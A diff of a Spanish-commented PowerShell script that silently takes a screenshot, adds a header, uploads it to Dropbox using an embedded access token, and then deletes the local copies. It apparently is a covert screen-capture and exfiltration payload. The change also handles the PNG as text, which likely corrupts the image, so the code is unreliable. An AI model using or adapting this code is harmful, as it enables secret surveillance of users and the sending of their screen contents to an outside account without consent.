@@ -20,31 +20,21 @@ function Show-Header {
 function DropBox-Upload {
     [CmdletBinding()]
     param (
-        [Parameter (Mandatory = $True)]
+        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
+        [Alias("f")]
         [string]$SourceFilePath
     )
     $outputFile = Split-Path $SourceFilePath -leaf
     $TargetFilePath = "/$outputFile"
     $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
     $authorization = "Bearer " + $db
-    $headers = @{
-        "Authorization" = $authorization
-        "Dropbox-API-Arg" = $arg
-        "Content-Type" = 'application/octet-stream'
-    }
-
-    # Añadir encabezado al contenido del archivo
-    $header = Show-Header
-    $fileContent = Get-Content -Path $SourceFilePath -Raw
-    $combinedContent = $header + "`r`n" + $fileContent
-    $tempFilePath = [System.IO.Path]::GetTempFileName()
-    Set-Content -Path $tempFilePath -Value $combinedContent
+    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+    $headers.Add("Authorization", $authorization)
+    $headers.Add("Dropbox-API-Arg", $arg)
+    $headers.Add("Content-Type", 'application/octet-stream')
 
     # Subir el archivo a Dropbox
-    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $tempFilePath -Headers $headers
-
-    # Limpiar el archivo temporal
-    Remove-Item -Path $tempFilePath -Force
+    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
 
 # Función para capturar la pantalla
@@ -66,15 +56,23 @@ try {
     # Capturar la pantalla y obtener la ruta del archivo
     $screenshotPath = Capture-Screen
 
-    # Subir la captura de pantalla a Dropbox
+    # Leer contenido de la captura de pantalla
+    $header = Show-Header
+    $fileContent = Get-Content -Path $screenshotPath -Raw
+    $combinedContent = $header + "`r`n" + $fileContent
+    $tempFilePath = "$env:temp\sc_with_header.png"
+    Set-Content -Path $tempFilePath -Value $combinedContent
+
+    # Subir la captura de pantalla con encabezado a Dropbox
     if (-not ([string]::IsNullOrEmpty($db))) {
-        DropBox-Upload -SourceFilePath $screenshotPath
+        DropBox-Upload -f $tempFilePath
     } else {
         Write-Error "No se proporcionó el token de acceso de Dropbox."
     }
 
-    # Limpiar el archivo de captura de pantalla
+    # Limpiar los archivos de captura de pantalla
     Remove-Item -Path $screenshotPath -Force
+    Remove-Item -Path $tempFilePath -Force
 }
 catch {
     Write-Error "Ocurrió un error: $_"
